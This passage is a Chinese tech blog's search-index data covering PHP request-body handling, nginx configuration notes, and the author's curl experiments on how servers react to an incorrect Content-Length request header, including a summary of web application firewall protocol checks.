","date":"2019-04-10","objectID":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/:4:0","tags":["php","phpredis","mcrypt"],"title":"php7安裝phpredis和mcrypt在docker方法","uri":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"最近有一支 API 踩到一個 API 他 request header 帶Content-Type: json 但我們平常寫程式可能不會注意到的地方 這邊我小記一下 ","date":"2019-04-08","objectID":"/blog/posts/POST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98/:0:0","tags":["php"],"title":"$_POST和php://input小記","uri":"/blog/posts/POST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"$_POST 只有 application/x-www-form-urlencoded or multipart/form-data 是有效的!! 只有 application/x-www-form-urlencoded or multipart/form-data 是有效的!! 只有 application/x-www-form-urlencoded or multipart/form-data 是有效的!! 所以當Content-Type:application/json $_POST 變數不會有任何作用!!! An associative array of variables passed to the current script via the HTTP POST method when using application/x-www-form-urlencoded or multipart/form-data as the HTTP Content-Type in the request. $HTTP_POST_VARS contains the same initial information, but is not a superglobal. (Note that $HTTP_POST_VARS and $_POST are different variables and that PHP handles them as such) 當 HTTP POST 請求的 Content-Type 是 application/x-www-form-urlencoded 或 multipart/form-data 時，會將變量以關聯數組形式傳入當前腳本。 $HTTP_POST_VARS 包含相同的信息，但它不是一個超全局變量。 (注意 $HTTP_POST_VARS 和 $_POST 是不同的變量，PHP 處理它們的方式不同) EX: ","date":"2019-04-08","objectID":"/blog/posts/POST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98/:1:0","tags":["php"],"title":"$_POST和php://input小記","uri":"/blog/posts/POST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"php://input Content-Type:multipart/form-data 是無效的!! Content-Type:multipart/form-data 是無效的!! Content-Type:multipart/form-data 是無效的!! php://input 是個可以訪問請求的原始數據的只讀流。 POST 請求的情況下，最好使用 php://input 來代替 $HTTP_RAW_POST_DATA，因為它不依賴於特定的 php.ini 指令。 而且，這樣的情況下 $HTTP_RAW_POST_DATA 默認沒有填充， 比激活 always_populate_raw_post_data 潛在需要更少的內存。 enctype=“multipart/form-data” 的時候 php://input 是無效的。 仔細想想，可以開發者工具來看，通常用multipart/form-data都是用來上傳檔案的，所以會看到一些串流內容 之前看過Xuite API，[Xuite 開發者首頁](http://api.xuite.net/document/xuite_dev/public/front/index/id/267) 他們上傳檔案API是要打兩次 第一次取upload資訊，會取得第二次上傳打API網址 事後覺得我想太多，他們 Content-Type 不是傳 JSON PHP: 支持的协议和封装协议 - Manual XYZ 的筆記本: PHP 使用 file_get_contents 接收 POST 的資料 備份圖 深入剖析 PHP 输入流 php://input – 简明现代魔法 備份圖 ","date":"2019-04-08","objectID":"/blog/posts/POST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98/:2:0","tags":["php"],"title":"$_POST和php://input小記","uri":"/blog/posts/POST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"$HTTP_RAW_POST_DATA PHP7.0 已移除，建議不要使用。 This feature was DEPRECATED in PHP 5.6.0, and REMOVED as of PHP 7.0.0. $HTTP_RAW_POST_DATA contains the raw POST data. See always_populate_raw_post_data. In general, php://input should be used instead of $HTTP_RAW_POST_DATA. ","date":"2019-04-08","objectID":"/blog/posts/POST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98/:3:0","tags":["php"],"title":"$_POST和php://input小記","uri":"/blog/posts/POST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"最近專案開始有使用 Nginx 之前沒有什麼機會用到 所以對設定也不是很清楚 趁這個機會整理 這邊有爬到nginxconfig.io 可以簡單設定 nginx 設定 這篇主要是紀錄目前專案有用到的設定 先分享最近專案用的 Codeigniter 的 nginx 設定檔 server { listen 80; index index.php index.html; server_name localhost; error_log /var/log/nginx/error.log; access_log /var/log/nginx/access.log; root /usr/local/nginx/html; location / { try_files $uri $uri/ /index.php; } location ~ ^.+\\.php { fastcgi_pass php-fpm:9000; fastcgi_index index.php; fastcgi_split_path_info ^(.+\\.php)(.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info; include fastcgi_params; } # unless the request is for a valid file (image, js, css, etc.), send to bootstrap if (!-e $request_filename) { rewrite ^/(.*)$ /index.php?/$1 last; break; } } 最近專案使用Codeigniter 在 nginx 上設定 rewrite 的方法 @ 秋風落葉、萍水相逢 - Matt 網頁製作 生活旅遊 日誌 :: 痞客邦 :: ","date":"2019-04-07","objectID":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:0:0","tags":null,"title":"nginx設定小記","uri":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"location 語法規則 location [ = | ~ | ~* | ^~ ] uri { … } location @name { … } 語法規則很簡單，一個 location 關鍵字，後面跟著可選的修飾符，後面是要匹配的字符，花括號中是要執行的操作。 修飾符 = 表示精確匹配。只有請求的 url 路徑與後面的字符串完全相等時，才會命中。 ~ 表示該規則是使用正則定義的，區分大小寫。 ~* 表示該規則是使用正則定義的，不區分大小寫。 ^~ 表示如果該符號後面的字符是最佳匹配，採用該規則，不再進行後續的查找。 參考來源 一文弄懂 Nginx 的 location 匹配 - 個人文章 - SegmentFault 思否 備份圖 location 順序/優先級： (location =) \u003e (location 完整路徑) \u003e (location ^~ 路徑) \u003e (location ~,~* 正則順序) \u003e (location 部分起始路徑) \u003e (/) 參考來源 nginx 中 location 的顺序(优先级)及 rewrite 规则写法 - 永福的博客 - 开源中国 ","date":"2019-04-07","objectID":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:1:0","tags":null,"title":"nginx設定小記","uri":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"root 簡單來說就是放的程式路徑 root 是指定項目的根目錄，適用與 server 和 location。可以指定多個，如果 locaiton 沒有指定，會往其外層的 server 或 http 中尋找繼承。 更多內容可以看Nginx 靜態服務配置—詳解 root 和 alias 指令 - 簡書 備份圖 ","date":"2019-04-07","objectID":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:2:0","tags":null,"title":"nginx設定小記","uri":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"try_files 這個函示有些 rewrite 可以套用在這功能上面 簡單檔案不存在的時候，可以自己設定指定到某一隻檔案 但要注意那個檔案需要存在，否則會 ERROR 看到網路上有人拿來做 cache location / { # 檢查是否有這個檔案或資料夾存在，不存在則使用index.php內容 try_files $uri $uri/ /index.php; } rewrite ^/(.*)$ /index.php?/$1 last;這段寫法是在網址前面加上 index.php 只要有關 index.php 都會導入到 phpfpm 裡面去 Nginx 的 try_files 参数保证能懂的讲解-10536390-51CTO 博客 備份圖 Nginx 的 try_files 指令使用实例 - 运维之美 请给你的 Laravel 一份更好的 Nginx 配置 · yii.im 備份圖 ","date":"2019-04-07","objectID":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:3:0","tags":null,"title":"nginx設定小記","uri":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"nginx if 計算指定的 condition 的值。如果為真，執行定義在大括號中的 rewrite 模塊指令，並將 if 指令中的配置指定給請求。if 指令會從上一層配置中繼承配置。 條件可以是下列任意一種： 變量名；如果變量值為空或者是以「0」開始的字符串，則條件為假； 使用「=」和「!=」運算符比較變量和字符串； 使用「~」（大小寫敏感）和「~*」（大小寫不敏感）運算符匹配變量和正則表達式。正則表達式可以包含匹配組，匹配結果後續可以使用變量$1..$9 引用。如果正則表達式中包含字符「}」或者「;」，整個表達式應該被包含在單引號或雙引號的引用中。 使用「-f」和「!-f」運算符檢查文件是否存在； 使用「-d」和「!-d」運算符檢查目錄是否存在； 使用「-e」和「!-e」運算符檢查文件、目錄或符號鏈接是否存在； 使用「-x」和「!-x」運算符檢查可執行文件； nginx location if 的匹配規則-殘劍-51CTO 博客 Nginx 配置陷阱之万恶的 if 指令 – 虚伪的灵魂 XYZ 的筆記本: Nginx if、and、網域名稱、GET 變數判斷 ","date":"2019-04-07","objectID":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:4:0","tags":null,"title":"nginx設定小記","uri":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"rewrite Context: server, location, if rewrite regex replacement [flag]; 搞懂 nginx 的 rewrite 模块 - youyu 岁月 - SegmentFault 思否 第七章：nginx 的 rewrite 规则详解 - 简书 Nginx Rewrite 規則寫法 | Helloyungke 因為我的專案程式有掛 nginx docker 裡面目錄 所以我猜測下面應該也能執行 location ~* \\.(js|jpg|png|css)$ { expires 30d; } [Laravel nginx conf file](https://gist.github.com/ashleydw/afd389b1e763d3c1cf1f) vhosts - Serving html / css / js files with nginx - Stack Overflow nginx rewrite 指令 last break 区别-Tenderrain-51CTO 博客 ","date":"2019-04-07","objectID":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:5:0","tags":null,"title":"nginx設定小記","uri":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"fastcgi fastcgi_index 相對就是 nginx index 差不多東西 nginx 配置里的 fastcgi_index 是用来干嘛？和 index 的区别是？ - 开源中国 因此不再建议大家使用以下方式（搜了一下，网上大量的文章，并且 nginx.conf 的默认配置也是使用这种方式）： ~~fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; ~~ include fastcgi_params; 而推荐使用最新的方式： include fastcgi.conf; fastcgi_split_path_info 舊版本的 nginx 使用如下方式配置 location ~ .php($|/) { set $script $uri; set $path_info \"\"; if ($uri ~ \"^(.+.php)(/.+)\") { \u003e set $script $1; \u003e set $path_info $2; } fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$script; fastcgi_param SCRIPT_NAME $script; fastcgi_param PATH_INFO $path_info; } 新版本的 nginx 也可以使用 fastcgi_split_path_info 指令來設置 PATH_INFO，舊的方式不再推薦使用，在 location 段添加如下配置。 location ~ ^.+.php { (...) fastcgi_split_path_info ^((?U).+.php)(/?.+)$; fastcgi_param SCRIPT_FILENAME /path/to/php$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param PATH_TRANSLATED $document_root\\$fastcgi_path_info; (...) } fastcgi_param 可設定環境參數 其他可參考ngx_http_fastcgi_module 的那些事 - Web 开发手扎 - SegmentFault 思否 備份圖 這邊我還是搞不懂 phpfpm 跟 mod_php 到底有什麼差別 有 google 爬到一篇，秒懂 FastCGI 是什麼? 接下來又提到那 FastCGI 是什麼呢? FastCGI 是用來提高 CGI 處理 process 性能用的 那 FastCGI 會怎麼實作呢? 當 php 啟動時、會去尋找 php.ini、進行環境的初始化，如果不使用 FastCGI 的情況下，每一個請求都會做這個動作，很明顯浪費系統資源，所以 FastCGI 會先啟動一個 master，解析配置文件用，接下來再啟動 worker，當請求過來時、master 會遞資訊給 worker，然後接下來等下一個請求，有這個機制就不用每一次重新跑一次初始化的動作了 秒懂 PHP 的 FastCGI 跟 PHP-FPM 有什麼關係 - Astral web 歐斯瑞公司 [转] fastcgi.conf 与 fastcgi_params - - ITeye 博客 $_SERVER[‘SCRIPT_FILENAME’] 与 FILE 区别 - 常斯特啰嗦司机 - 博客园 Nginx(PHP/fastcgi)的 PATH_INFO 配置 | 尘埃 nginx 新手配置$document_root - 海盗船的个人空间 - 开源中国 nginx 使用 arg_重写带参数 url 案例-明天过后-51CTO 博客 ","date":"2019-04-07","objectID":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:6:0","tags":null,"title":"nginx設定小記","uri":"/blog/posts/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":["寫程式一些事"],"content":"最近公司有一個案子，對方用程式打 API 竟然會會帶content-length:2，但並未帶 body 值 導致程式會不正確，但對方說程式已經用現有的 function，所以沒辦法修正 最後這個問題還是沒法解決 這幾天研究content-length:2會影響什麼情形 在公司和家裡測試結果會不太一樣讓我矇 B 所以測試的時候不知道發生什麼事情 這邊只記錄我測出來結果 注意這邊的 Content-Length 都先只 request header 裡面 不是只 response Content-Length ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:0:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"介紹 request Content-Length 簡單一句話，就是 POST DATA 資料傳給 Server 長度。 有找到更短詳細介紹 響應為 1xx，204，304 相應或者 head 請求，則直接忽視掉消息實體內容。 如果有 Transfer-Encoding，則優先採用 Transfer-Encoding 裡面的方法來找到對應的長度。比如說 Chunked 模式。 「如果 head 中有 Content-Length，那麼這個 Content-Length 既表示實體長度，又表示傳輸長度。如果實體長度和傳輸長度不相等(比如說設置了 Transfer-Encoding)，那麼則不能設置 Content-Length。如果設置了 Transfer-Encoding，那麼 Content-Length 將被忽視」。這句話翻譯的優點饒，其實關鍵就一點：有了 Transfer-Encoding，則不能有 Content-Length。 通過服務器關閉連接能確定消息的傳輸長度。(請求端不能通過關閉連接來指明請求消息體的結束，因為這樣可以讓服務器沒有機會繼續給予響應)。這種情況主要對應為短連接，即非 keep-alive 模式。 HTTP1.1 必須支持 chunk 模式。因為當不確定消息長度的時候，可以通過 chunk 機制來處理這種情況。 在包含消息內容的 header 中，如果有 content-length 字段，那麼該字段對應的值必須完全和消息主題裡面的長度匹配。 其實後面幾條幾乎可以忽視，簡單總結後如下： 1、Content-Length 如果存在並且有效的話，則必須和消息內容的傳輸長度完全一致。(經過測試，如果過短則會截斷，過長則會導致超時。) 2、如果存在 Transfer-Encoding(重點是 chunked)，則在 header 中不能有 Content-Length，有也會被忽視。 3、如果採用短連接，則直接可以通過服務器關閉連接來確定消息的傳輸長度。(這個很容易懂) 結合 HTTP 協議其他的特點，比如說 Http1.1 之前的不支持 keep alive。那麼可以得出以下結論： 1、在 Http 1.0 及之前版本中，content-length 字段可有可無。 2、在 http1.1 及之後版本。如果是 keep alive，則 content-length 和 chunk 必然是二選一。若是非 keep alive，則和 http1.0 一樣。content-length 可有可無。 ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:1:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"靜態資源 先講一下，這邊靜態資源是指*.jpg,*.png,*js,*.json 以下測試會以 nginx 為主 ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:2:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"HTTP Content-Length 數值不正確 可正常執行 連http時候，靜態資源不管Content-Length帶多少(正確或不正確)，apache,nginx 都可以正常回傳程式 我在我的電腦裝 nginx 測試 雖然有些網站可能不正常，目前推測可能有防火牆關係 防火牆可能會分析這封包不正確，可能會阻擋 不能正確連線 EX: curl -v --request \"GET\" --header \"content-length:2\" http://www.cyut.edu.tw/~ywfan/index.htm Note: Unnecessary use of -X or --request, GET is already inferred. * Trying 163.17.1.15... * TCP_NODELAY set * Connected to www.cyut.edu.tw (163.17.1.15) port 80 (#0) \u003e GET /~ywfan/index.htm HTTP/1.1 \u003e Host: www.cyut.edu.tw \u003e User-Agent: curl/7.58.0 \u003e Accept: */* \u003e content-length:2 \u003e 可以正常連線，這邊隨便有找到一個可正常連線 我上面先前我有打可能會跟防火牆(這邊防火牆不是指 OS 防火牆) 因為我家可以正常打、公司那邊會不正常 所以可能被硬體防火牆(Web Application Firewall)阻擋 家裡執行指令  curl -v --request \"GET\" --header \"content-length:200\" http://jimmypm.ehosting.com.tw/a.htm Note: Unnecessary use of -X or --request, GET is already inferred. * Trying 203.69.42.72... * TCP_NODELAY set * Connected to jimmypm.ehosting.com.tw (203.69.42.72) port 80 (#0) \u003e GET /a.htm HTTP/1.1 \u003e Host: jimmypm.ehosting.com.tw \u003e User-Agent: curl/7.58.0 \u003e Accept: */* \u003e content-length:200 \u003e \u003c HTTP/1.1 200 OK \u003c Content-Type: text/html \u003c Last-Modified: Thu, 04 Apr 2019 04:12:18 GMT \u003c Accept-Ranges: bytes \u003c ETag: \"923231989cead41:0\" \u003c Server: Microsoft-IIS/7.5 \u003c X-Powered-By: ASP.NET \u003c Date: Fri, 05 Apr 2019 16:23:21 GMT \u003c Content-Length: 48739 \u003c 公司執行指令結果 $ curl -v --request \"GET\" --header \"content-length:200\" http://jimmypm.ehosting.com.tw/a.htm Note: Unnecessary use of -X or --request, GET is already inferred. % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- 0:00:01 --:--:-- 0* Trying 203.69.42.72... * TCP_NODELAY set * Connected to jimmypm.ehosting.com.tw (203.69.42.72) port 80 (#0) \u003e GET /a.htm HTTP/1.1 \u003e Host: jimmypm.ehosting.com.tw \u003e User-Agent: curl/7.61.1 \u003e Accept: */* \u003e content-length:200 \u003e 0 0 0 0 0 0 0 0 --:--:-- 0:02:18 --:--:-- 0*Empty reply from server * Connection #0 to host jimmypm.ehosting.com.tw left intact curl: (52) Empty reply from server ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:2:1","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"動態資源 例如*.asp,*.jsp,*.php 只要做到Content-Length:2 沒有送出data(POST DATA) 就會出錯，接收到408 連線逾時。 這邊簡單詳細講一下，Server 是主動關閉的，這時候 client 會持續等待，使用者關閉頁面，也不會影響結果 使用者沒有關閉的話，Server 沒接收 data 資料，就會回傳408 這時候使用者會接收到408 維基百科 408 Request Timeout 請求超時。根據 HTTP 規範，用戶端沒有在伺服器預備等待的時間內完成一個請求的傳送，用戶端可以隨時再次提交這一請求而無需進行任何更改 ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:3:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"HTTPS 不管靜態資源、動態資源都會錯誤 動態資源 curl -v --request \"GET\" --header \"Content-Length:3\" --data \"12345\" https://tw.yahoo.com  ✔  20  15:16:43 * Rebuilt URL to: https://tw.yahoo.com/ * Trying 124.108.103.104... * TCP_NODELAY set * Connected to tw.yahoo.com (124.108.103.104) port 443 (#0) * ALPN, offering h2 * ALPN, offering http/1.1 * successfully set certificate verify locations: * CAfile: /etc/ssl/certs/ca-certificates.crt CApath: /etc/ssl/certs * TLSv1.2 (OUT), TLS handshake, Client hello (1): * TLSv1.2 (IN), TLS handshake, Server hello (2): * TLSv1.2 (IN), TLS handshake, Certificate (11): * TLSv1.2 (IN), TLS handshake, Server key exchange (12): * TLSv1.2 (IN), TLS handshake, Server finished (14): * TLSv1.2 (OUT), TLS handshake, Client key exchange (16): * TLSv1.2 (OUT), TLS change cipher, Client hello (1): * TLSv1.2 (OUT), TLS handshake, Finished (20): * TLSv1.2 (IN), TLS handshake, Finished (20): * SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256 * ALPN, server accepted to use h2 * Server certificate: * subject: C=US; ST=California; L=Sunnyvale; O=Oath Inc; CN=*.www.yahoo.com * start date: Feb 1 00:00:00 2019 GMT * expire date: Jul 31 12:00:00 2019 GMT * subjectAltName: host \"tw.yahoo.com\" matched cert's \"tw.yahoo.com\" * issuer: C=US; O=DigiCert Inc; OU=www.digicert.com; CN=DigiCert SHA2 High Assurance Server CA * SSL certificate verify ok. * Using HTTP2, server supports multi-use * Connection state changed (HTTP/2 confirmed) * Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0 * Using Stream ID: 1 (easy handle 0x55d96331c780) \u003e GET / HTTP/2 \u003e Host: tw.yahoo.com \u003e User-Agent: curl/7.58.0 \u003e Accept: */* \u003e Content-Length:3 \u003e Content-Type: application/x-www-form-urlencoded \u003e * We are completely uploaded and fine * Connection state changed (MAX_CONCURRENT_STREAMS updated)! * Connection #0 to host tw.yahoo.com left intact curl: (16) Error in the HTTP2 framing layer 靜態資源 curl --request \"GET\" --header \"Content-Length:3\" https://code.jquery.com/jquery-1.11.3.js curl: (52) Empty reply from server ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:4:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"Content-Length 接收的值\u003eHeader 值 我有簡單寫個 PHP 程式 \u003c?php $data = file_get_contents('php://input'); var_dump($data); 簡單可以看出 post raw data 這邊用 nginx+phpfpm 測出來結果 其實會被截斷 curl -v --request \"GET\" --header \"Content-Length:3\" --data \"12345\" http://192.168.1.121:32771/testpost.php * Trying 192.168.1.121... * TCP_NODELAY set * Connected to 192.168.1.121 (192.168.1.121) port 32771 (#0) \u003e GET /testpost.php HTTP/1.1 \u003e Host: 192.168.1.121:32771 \u003e User-Agent: curl/7.58.0 \u003e Accept: */* \u003e Content-Length:3 \u003e Content-Type: application/x-www-form-urlencoded \u003e * upload completely sent off: 5 out of 5 bytes \u003c HTTP/1.1 200 OK \u003c Date: Sat, 06 Apr 2019 07:14:21 GMT \u003c Server: Apache/2.4.25 (Debian) \u003c Content-Length: 16 \u003c Content-Type: text/html; charset=UTF-8 \u003c string(3) \"123\" * Connection #0 to host 192.168.1.121 left intact ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:5:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"Apache Cotent-Length 不會 408 今天發現有一個 PHP 網站，content-length:x都可以正常運作 不過發現是用apache+mod_php 我自己有測試還真的能 work curl --request \"GET\" --header \"Content-Length:3\" http://mcu.no-ip.org/ 可用這個 docker hub 做簡單測試 eboraas/apache-php Dockerfile - Docker Hub PS:apache+php-fpm 不會回傳 response，但說奇怪 apache log 會顯示 200 以下是 apache+php-fpm curl -v --request \"GET\" --header \"Content-Length:3\" http://192.168.1.121:32772/testpost.php Note: Unnecessary use of -X or --request, GET is already inferred. * Trying 192.168.1.121... * TCP_NODELAY set * Connected to 192.168.1.121 (192.168.1.121) port 32772 (#0) \u003e GET /phpinfo.php HTTP/1.1 \u003e Host: 192.168.1.121:32772 \u003e User-Agent: curl/7.58.0 \u003e Accept: */* \u003e Content-Length:3 \u003e \u003c HTTP/1.1 200 OK \u003c Date: Sat, 06 Apr 2019 07:08:31 GMT \u003c Server: Apache/2.4.7 (Ubuntu) \u003c Connection: close \u003c * Closing connection 0 什麼 Apache 跟 nginx 結果不太一樣!!! 我也冏了!!!不過依然沒有找到相關文獻 在 Apache 官網文件mod_policy - Apache HTTP Server Version 2.5 PolicyLength Directive Description: Enable the content length policy. Syntax: PolicyLength ignore|log|enforce Default: ignore Context: server config, virtual host, directory Status: Extension Module: mod_policy Compatibility: PolicyLength is only available in Apache 2.5.0 and later. 不確定是不是這個關係，目前他說這個選項 Apache2.5 才會有(現在才 Apache2.4) 我找不到 2.5 版本= = 有可能現在是讓他過 ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:6:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"Web Application Firewall 影響 有爬到這個，目前猜測公司或有些網站連不到可能之中有類似 WAF 這東西影響到 Web Application Firewall 的偵測原理 – 軟體品管的專業思維 HTTP 標準協議 檢查請求的內容是否符合 HTTP 標準協議, 這是一種比較有效且直覺的方式 任意修改 HTTP 協議內容可能會導致的攻擊如下: http://capec.mitre.org/data/definitions/220.html HTTP 協議中檢查的重點為: MIME 中 filename 檔名 URL 合法性 Content-Length 數值 衝突與重複的 HTTP headers, 例如 keep-alive 與 close 重複與衝突 不安全的字元, 例如 ” “, “\u003c“, “\u003e”, “{“, “}”, “|”, “\\”, “^”, “~”, “[“, “]”, and “`”.等 過濾異常缺少 Http header 的請求, 一般正常的請求會包含 Host, User-Agent, Accept headers, 因此如果缺少或是沒有值都是表示異常 Content-Length 不等於 0 但是卻沒有 Content-Type HTTP protocol version ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:7:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"nginx 從 phpfpm 那邊調整 改 header 失敗筆記 在這裡面Nginx 之 fastcgi_param 参数详见 - 简书 fastcgi_param CONTENT_LENGTH $content_length; #请求头中的Content-length字段。 發現這個不會正常執行 目前猜測 nginx 在接收 request 封包時候，第一時間不會做更改 但當時Content-Length:2會持續等待 所以可能在等接收資料，逾時會傳 408 所以根本不會做到修改 header 那一段正確來說 php-fpm 那段沒有執行到 收不到改 header 那段 